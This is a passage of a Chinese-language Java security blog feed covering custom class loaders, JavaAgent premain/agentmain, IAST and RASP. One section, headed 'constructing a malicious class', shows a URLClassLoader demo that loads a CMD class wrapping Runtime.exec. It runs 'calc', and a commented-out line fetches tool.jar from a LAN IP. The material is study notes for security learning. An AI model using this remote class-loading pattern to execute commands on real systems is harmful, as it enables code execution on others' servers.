</span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> TestClassLoader();</span><br><span class="line">        <span class="comment">//使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">        Class testClass = loader.loadClass(testClassName);</span><br><span class="line">        <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">        Object testInstance = testClass.newInstance();</span><br><span class="line">        <span class="comment">// 反射获取hello方法</span></span><br><span class="line">        Method method = testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">        String str = (String) ((Method) method).invoke(testInstance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字节码生成代码："><a href="#字节码生成代码：" class="headerlink" title="字节码生成代码："></a>字节码生成代码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">toByteArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] toByteArray(String filePath) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//filePath = &quot;F:\\IdeaProjects\\test\\src\\com\\drop\\test\\TestHelloWorld.class&quot;;</span></span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(filePath);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">4</span>];</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(bytes, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        toByteArray tb = <span class="keyword">new</span> toByteArray();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(tb.toByteArray(<span class="string">&quot;F:\\IdeaProjects\\test\\src\\com\\drop\\test\\TestHelloWorld.class&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p><h2 id="构造恶意类"><a href="#构造恶意类" class="headerlink" title="构造恶意类"></a>构造恶意类</h2><h3 id="static方法"><a href="#static方法" class="headerlink" title="static方法"></a>static方法</h3><p>在没有创建对象的情况下来进行调用（方法/变量）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CMD</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestURLClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径,jar中是CMD.java的class文件</span></span><br><span class="line">            <span class="comment">//URL url = new URL(&quot;http://192.168.47.128:8000/tool.jar&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义远程加载本地java文件</span></span><br><span class="line">            File f = <span class="keyword">new</span> File(<span class="string">&quot;F:\\IdeaProjects\\test\\src\\com\\drop\\test\\CMD.java&quot;</span>);</span><br><span class="line">            URL url = f.toURL();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            URLClassLoader curl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            String cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//定义远程加载的jar路径,这里写包的路径</span></span><br><span class="line">            <span class="comment">//Class cmdClass = curl.loadClass(&quot;CMD&quot;);</span></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            Class&lt;?&gt; cmdClass = curl.loadClass(<span class="string">&quot;com.drop.test.CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="keyword">null</span>,cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220104151915409.png" alt="image-20220104151915409"></p><h1 id="类加载隔离"><a href="#类加载隔离" class="headerlink" title="类加载隔离"></a>类加载隔离</h1><p><img src="https://javasec.oss-cn-hongkong.aliyuncs.com/images/202110251829223.png" alt="image-20211025171150475"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.drop.test.TestClassLoader.testClassBytes;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.drop.test.TestClassLoader.testClassName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCrossClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderA</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ClassLoaderA</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderB</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ClassLoaderB</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 父类加载器</span></span><br><span class="line">        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// A类加载器</span></span><br><span class="line">        ClassLoaderA aClassLoader = <span class="keyword">new</span> ClassLoaderA(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// B类加载器</span></span><br><span class="line">        ClassLoaderB bClassLoader = <span class="keyword">new</span> ClassLoaderB(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用A/B类加载器加载同一个类</span></span><br><span class="line">        Class&lt;?&gt; aClass  = Class.forName(testClassName, <span class="keyword">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; aaClass = Class.forName(testClassName, <span class="keyword">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; bClass  = Class.forName(testClassName, <span class="keyword">true</span>, bClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较A类加载和B类加载器加载的类是否相等</span></span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == aaClass：&quot;</span> + (aClass == aaClass));</span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == bClass：&quot;</span> + (aClass == bClass));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span> + aClass.getName() + <span class="string">&quot;方法清单：&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该类所有方法</span></span><br><span class="line">        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类实例</span></span><br><span class="line">        Object instanceA = aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取hello方法</span></span><br><span class="line">        Method helloMethod = aClass.getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用hello方法</span></span><br><span class="line">        String result = (String) helloMethod.invoke(instanceA);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反射调用：&quot;</span> + testClassName + <span class="string">&quot;类&quot;</span> + helloMethod.getName() + <span class="string">&quot;方法，返回结果：&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaAgent</title>
      <link href="/p/dc8c4078.html"/>
      <url>/p/dc8c4078.html</url>
      
        <content type="html"><![CDATA[<p>JDK1.5 开始引入了 Agent 机制 (即启动 java 程序时添加 <code>-javaagent</code> 参数”, 如 <code>java -javaagent:/data/test.jar LingXeTest</code>)，Java Agent 机制允许用户在 JVM 加载 class 文件的时候<strong>先加载自己编写的 Agent 文件</strong>，通过修改 <strong>JVM 传入的字节码</strong>来实现注入 RASP 防御逻辑。这种方式因为必须是在容器启动时添加 jvm 参数，所以需要重启 Web 容器。JDK1.6 新增了 attach 方式 (agentmain)，可以对运行中的 java 进程附加 agent。使用附加的方式可以在容器运行时动态的注入 RASP 防御逻辑。</p><h1 id="IAST"><a href="#IAST" class="headerlink" title="IAST"></a>IAST</h1><h2 id="概念比较"><a href="#概念比较" class="headerlink" title="概念比较"></a>概念比较</h2><table><thead><tr><th>概念</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>SAST</td><td>静态应用程序安全测试，在编码阶段分析应用程序的源代码或二进制文件的语法、结构、过程、接口等来发现程序代码存在的安全漏洞。</td><td>白盒测试</td></tr><tr><td>DAST</td><td>动态应用程序安全测试,模拟黑客行为对应用程序进行动态攻击，分析应用程序的反应，从而确定该 Web 应用是否易受攻击。</td><td>黑盒测试</td></tr><tr><td>IAST</td><td>交互式应用程序安全测试，通过 Web 应用服务端部署运行时插桩、终端流量代理/VPN、旁路流量镜像及部署主机 Agent流量嗅探软件等，收集、监控 Web 应用程序运行时函数执行、数据传输，并与分析引擎端进行实时交互，高效、准确的识别安全缺陷及漏洞。</td><td>灰盒测试</td></tr></tbody></table><h2 id="运行时插桩模式"><a href="#运行时插桩模式" class="headerlink" title="运行时插桩模式"></a>运行时插桩模式</h2><p>主动插桩技术需要在被测试应用程序中部署插桩探针，使用时需要外部扫描器去触发这个 Agent。一个组件<strong>产生恶意攻击流量</strong>，另一个组件在被测应用程序中<strong>监测应用程序的反应</strong>，由此来进行漏洞定位和降低误报。</p><h3 id="主动插桩"><a href="#主动插桩" class="headerlink" title="主动插桩"></a>主动插桩</h3><ol><li> 被测试服务器中安装 IAST 插桩探针； </li><li> DAST Scanner 主动发起扫描测试； </li><li> IAST 插桩探针追踪被测试应用程序在扫描期间的反应，并动态分析测试覆盖率和上下文。当当定位到具体漏洞信息时，将有关信息发送给管理控制台，控制台展示安全测试结果。 </li></ol><h3 id="被动插桩"><a href="#被动插桩" class="headerlink" title="被动插桩"></a>被动插桩</h3><ol><li>被测试服务器中安装 IAST 插桩探针； </li><li>插桩探针在应用程序运行时获取请求和代码数据流、代码控制流，进行<a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.5_taint_analysis.md">动态污点追踪</a>； </li><li>当定位到具体漏洞信息，插桩探针将获取的信息发送给管理控制台，控制台展示应用安全测试结果。 </li></ol><blockquote><p>不会主动对 Web 应用程序执行攻击，而是纯粹被动地分析检测代码。</p></blockquote><h2 id="终端流量代理模式"><a href="#终端流量代理模式" class="headerlink" title="终端流量代理模式"></a>终端流量代理模式</h2><p>不需要装agent，安全测试会产生一定的脏数据。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211229170934435.png" alt="image-20211229170934435"></p><h1 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h1><p>运行时应用程序自我保护，它的实现方式是通过Instrumentation编写一个agent，在 agent 中加入 hook 点，当程序运行流程到了 hook 点时，将检测流程插入到字节码文件中，统一进入JVM中执行。RASP需要能修改.class文件并且在JVM解释执行的时候注入保护程序。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211229172553629.png" alt="image-20211229172553629"></p><h2 id="Java部署的两种方式"><a href="#Java部署的两种方式" class="headerlink" title="Java部署的两种方式"></a>Java部署的两种方式</h2><p>一个代理实现ClassFileTransformer接口用于改变运行时的字节码<code>class File</code>，这个改变发生在jvm加载这个类之前。对所有的类加载器有效。</p><p><code>class File</code>这个术语定义于虚拟机规范3.1，指的是字节码的byte数组，而不是文件系统中的class文件。</p><h3 id="premain方式"><a href="#premain方式" class="headerlink" title="premain方式"></a>premain方式</h3><p>允许在main开始前修改字节码，也就是在大部分类加载前对字节码进行修改。</p><p><strong>实现方式：</strong></p><p>通过修改 Tomcat、Jetty 和 Springboot 等的启动脚本，给JVM增加 javaagent 参数来让JVM加载一个Java Agent</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/path/to/your/agent.jar -jar XXX.jar</span><br></pre></td></tr></table></figure><blockquote><p>知道 web 容器的安装路径</p></blockquote><p><strong>具体代码：</strong></p><p>创建<code>PreTest.jar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;run test main&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建<code>PreAgent.jar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation is)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;run premain agent before test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行<code>java -javaagent:PreAgent.jar -jar PreTest.jar</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220112162516225.png" alt="image-20220112162516225"></p><h3 id="agentmain方式"><a href="#agentmain方式" class="headerlink" title="agentmain方式"></a>agentmain方式</h3><p>允许在main执行后通过com.sun.tools.attach的Attach API attach到程序运行时中，通过retransform的方式修改字节码，也就是在类加载后通过类重新转换（定义）的方式在方法体中对字节码进行修改，其本质还是在类加载前对字节码进行修改。</p><p><strong>实现方式：</strong></p><p>RASP 守护进程发现了 Java 进程之后，对Java进程依赖的jar包进行分析，从对象存储服务下载对应 jar 包的插件到目标主机上，然后 attach 到目标 JVM 上，目标 JVM 在初始化一个 **轻量级的 Agent (仅一个类)**，最后动态加载核心插件 jar 包。</p><h3 id="MANIFEST-MF参数"><a href="#MANIFEST-MF参数" class="headerlink" title="MANIFEST.MF参数"></a>MANIFEST.MF参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Premain-Class: 包含 premain 方法的类（类的全路径名）</span><br><span class="line">Agent-Class: 包含 agentmain 方法的类（类的全路径名）</span><br><span class="line">Boot-Class-Path: 设置引导类加载器搜索的路径列表。查找类的特定于平台的机制失败后，引导类加载器会搜索这些路径。按列出的顺序搜索路径。列表中的路径由一个或多个空格分开。路径使用分层 URI 的路径组件语法。如果该路径以斜杠字符（“/”）开头，则为绝对路径，否则为相对路径。相对路径根据代理 JAR 文件的绝对路径解析。忽略格式不正确的路径和不存在的路径。如果代理是在 VM 启动之后某一时刻启动的，则忽略不表示 JAR 文件的路径。（可选）</span><br><span class="line">Can-Redefine-Classes: true表示能重定义此代理所需的类，默认值为 false（可选）</span><br><span class="line">Can-Retransform-Classes: true 表示能重转换此代理所需的类，默认值为 false （可选）</span><br><span class="line">Can-Set-Native-Method-Prefix: true表示能设置此代理所需的本机方法前缀，默认值为 false（可选）</span><br></pre></td></tr></table></figure><blockquote><p>需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</p></blockquote><h3 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h3><p><strong>agent运作模式</strong>不同：premain相当于在main前类加载时进行字节码修改，agentmain是main后在类调用前通过重新转换类完成字节码修改。可以发现他们的本质都是在类加载前完成的字节码修改，但是premain可以直接修改或者通过redefined进行类重定义，而agentmian必须通过retransform进行类重新转换才能完成字节码修改操作。</p><p><strong>部署方式</strong>不同：由于agent运作模式的不同，所以才导致premain需要在程序启动前指定agent，而agentmain需要通过Attach API进行attach。而且由于都是在类加载前进行字节码的修改，所以如果premain模式的hook进行了更新，就只能重启服务器，而agentmain模式的hook如果进行了更新的话，需要重新attach。</p><h3 id="两者缺陷"><a href="#两者缺陷" class="headerlink" title="两者缺陷"></a>两者缺陷</h3><ul><li>premain：每次修改需要重启服务。</li><li>agentmain：由于attach的运行时中的进程，因JVM的进程保护机制，禁止在程序运行时对运行时的类进行自由的修改，具体的限制如下：<ul><li>父类应为同一个类</li><li>实现的接口数要相同</li><li>类访问符要一致</li><li>字段数和字段名必须一致</li><li>新增的方法必须是<code>private static/final</code>的</li><li>可是删除修改方法</li></ul></li></ul><blockquote><p>通过<a href="https://c0d3p1ut0s.github.io/%E4%B8%80%E7%B1%BBPHP-RASP%E7%9A%84%E5%AE%9E%E7%8E%B0/">动态污点跟踪，基于词法分析的漏洞检测</a>解决如何跟踪信息流，如何检测安全性两个问题。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.jrasp.com/">http://www.jrasp.com/</a></p><p><a href="https://rasp.baidu.com/doc/install/compat.html">https://rasp.baidu.com/doc/install/compat.html</a></p><p><a href="https://mp.weixin.qq.com/s?search_click_id=13076730495468182004-1640738279031-017813&sub=&__biz=Mzg4NDU4OTQ1NA==&mid=2247484084&idx=1&sn=364c4366c1bdfeb57badb58278e20e96&chksm=cfb49455f8c31d43b5acb3df1368b2047d504aa498605f5eedd9dd315a25ece985ef89d748c3&scene=3&subscene=10000&clicktime=1640738279&enterid=1640738279&ascene=0&devicetype=android-30&version=28000f41&nettype=cmnet&abtest_cookie=AAACAA==&lang=zh_CN&exportkey=AxaY1n7Zzl2XHxPai3EyDH8=&pass_ticket=FYX+zPyikQDHYqRGuDhMxG6lDIpZfgqydzgn7+YGHGY83/RIcvTTjk7Og+jYtVML&wx_header=1">RASP对抗技术浅析</a></p><p><a href="https://www.anquanke.com/post/id/187415#h3-3">https://www.anquanke.com/post/id/187415#h3-3</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射机制</title>
      <link href="/p/7af799fd.html"/>
      <url>/p/7af799fd.html</url>
      
        <content type="html"><![CDATA[<p>Reflection(反射)被视为<strong>动态语言</strong>的关键，反射机制允许程序在执行期借助于<code>Reflection API</code>取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><p>反射机制提供的功能</p><ul><li>在运行时<strong>判断</strong>任意一个<strong>对象所属的类</strong></li><li>在运行时<strong>构造</strong>任意一个<strong>类的对象</strong></li><li>在运行时<strong>判断</strong>任意一个类所具有的<strong>成员变量和方法</strong></li><li>在运行时<strong>调用</strong>任意一个对象的<strong>成员变量和方法</strong></li><li>生成<strong>动态代理</strong></li></ul><h1 id="反射应用"><a href="#反射应用" class="headerlink" title="反射应用"></a>反射应用</h1><p>创建一个person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 